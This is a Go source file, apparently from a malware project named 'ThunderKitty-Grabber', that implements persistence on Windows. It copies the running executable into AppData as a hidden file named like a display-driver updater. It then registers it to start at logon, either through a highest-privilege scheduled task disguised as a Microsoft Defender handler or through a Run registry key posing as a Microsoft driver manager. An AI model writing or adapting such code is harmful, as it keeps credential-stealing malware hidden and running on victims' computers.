package Persistence

import (
	Common "ThunderKitty-Grabber/utils/common"
	"fmt"
	"golang.org/x/sys/windows/registry"
	"io"
	"os"
	"os/exec"
	"path/filepath"
	"strings"
	"syscall"
)

func createRegistryPersistence(path string) {
	k, err := registry.OpenKey(registry.CURRENT_USER, `SOFTWARE\Microsoft\Windows\CurrentVersion\Run`, registry.ALL_ACCESS)
	if err != nil {
		fmt.Println("Error opening registry key", err)
		return
	}
	defer k.Close()

	_, _, err = k.GetStringValue("Microsoft Display Driver Manager")
	if err != nil {
		err = k.SetStringValue("Microsoft Display Driver Manager", path)
		if err != nil {
			fmt.Println(err)
			return
		}
	}
}

func createScheduledTaskPersistence(path string) {
	cmd := exec.Command("schtasks.exe", "/create", "/tn", "Microsoft Defender Threat Intelligence Handler", "/sc", "ONLOGON", "/tr", path, "/rl", "HIGHEST")
	cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
	cmd.Run()
}

func Create() {
	executablePath, err := os.Executable()
	if err != nil {
		fmt.Print(err)
		return
	}
	newPath := filepath.Join(os.Getenv("APPDATA"), "DisplayDriverUpdater.exe")

	if !strings.Contains(executablePath, "AppData") {
		// Copy the executable to %appdata%
		src, err := os.Open(executablePath)
		if err != nil {
			fmt.Print(err)
			return
		}
		defer src.Close()

		dest, err := os.Create(newPath)
		if err != nil {
			fmt.Print(err)
			return
		}
		defer dest.Close()

		_, err = io.Copy(dest, src)
		if err != nil {
			fmt.Print(err)
			return
		}
	}

	// Set the file to hidden
	ptr, err := syscall.UTF16PtrFromString(newPath)
	if err != nil {
		fmt.Println(err)
		return
	}
	err = syscall.SetFileAttributes(ptr, syscall.FILE_ATTRIBUTE_HIDDEN)
	if err != nil {
		fmt.Println(err)
		return
	}

	if Common.IsElevated() {
		createScheduledTaskPersistence(newPath)
	} else {
		createRegistryPersistence(newPath)
	}
}
